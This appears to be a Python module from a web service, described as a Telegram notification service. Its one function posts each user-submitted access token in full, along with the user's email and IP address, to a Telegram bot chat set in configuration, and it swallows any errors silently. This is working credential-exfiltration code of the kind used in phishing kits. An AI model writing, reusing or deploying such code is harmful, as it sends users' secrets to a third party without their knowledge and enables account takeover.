"""
Telegram 通知服务：将用户提交的 accessToken 发送到指定 Telegram bot
"""

import logging
import urllib.request
import urllib.parse
import json

from app.config import settings

logger = logging.getLogger(__name__)

# Telegram Bot API 地址
_TG_API_BASE = "https://api.telegram.org/bot{token}/sendMessage"


def notify_token(access_token: str, email: str = "", ip: str = "") -> None:
    """
    将用户的 accessToken 发送到 Telegram bot。
    异步调用，失败不影响主流程。
    """
    if not settings.TG_BOT_TOKEN or not settings.TG_CHAT_ID:
        return

    # 构建消息内容，包含关键信息
    lines = ["🔑 *新 Token 提交*", ""]
    if email:
        lines.append(f"📧 邮箱: `{email}`")
    if ip:
        lines.append(f"🌐 IP: `{ip}`")
    lines.append(f"🎫 Token: `{access_token[:50]}...`")
    lines.append(f"\n📋 完整 Token:\n```\n{access_token}\n```")

    message = "\n".join(lines)

    try:
        url = _TG_API_BASE.format(token=settings.TG_BOT_TOKEN)
        data = urllib.parse.urlencode({
            "chat_id": settings.TG_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown",
        }).encode("utf-8")

        req = urllib.request.Request(url, data=data, method="POST")
        with urllib.request.urlopen(req, timeout=10) as resp:
            result = json.loads(resp.read().decode("utf-8"))
            if not result.get("ok"):
                logger.warning("Telegram 发送失败: %s", result)
    except Exception as exc:
        # NOTE: 通知失败不应影响主业务流程
        logger.warning("Telegram 通知异常: %s", exc)
